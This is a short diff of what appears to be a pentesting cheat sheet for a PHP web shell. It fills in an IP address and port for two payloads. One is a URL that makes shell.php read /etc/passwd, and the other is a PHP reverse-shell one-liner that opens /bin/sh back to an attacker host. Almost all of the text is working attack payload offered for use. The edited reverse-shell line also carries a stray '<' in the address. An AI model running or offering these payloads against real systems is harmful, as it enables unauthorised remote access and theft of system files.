@@ -6,8 +6,10 @@ Simple one-liner to execute remote code on a system
 
 # Dump Password file
 
-http://<ip>/shell.php?id=/etc/passwd
+http://10.10.10.10/shell.php?id=/etc/passwd
   
 # Reverse Shell (PHP)
 
-http://<ip>/shell.php?id=php -r '$sock=fsockopen("<reverse_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+http://10.10.10.10/shell.php?id=php -r '$sock=fsockopen("<10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+  
+  
